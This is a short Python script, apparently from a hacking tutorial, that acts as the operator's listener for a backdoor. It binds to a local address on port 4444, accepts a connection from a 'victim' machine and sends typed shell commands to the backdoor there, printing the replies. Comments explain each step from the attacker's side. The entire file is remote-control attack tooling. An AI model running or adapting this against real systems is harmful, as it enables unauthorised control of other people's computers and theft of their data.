import socket


listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.29.75", 4444))
listener.listen(0)
print("[+] Waiting for incomming connections ...")
connection, address = listener.accept()
# listener.accept() returns 2 values
# (i) A new socket object which can be used to send and receiver messages
# (ii) ip address of computer which is requesting for connecting with our kali
print("[+] Got a connection from " + str(address))

while True:
    command = input(">> ")   # we are asking user (hacker who is using kali linux) to enter an input and we are storing it in a variable called command
    connection.send(command)    # this command will be sent from our kali linux machine to the victims computer (sending command to our backdoor which is present in victims computer)
    result = connection.recv(1024)
    print(result)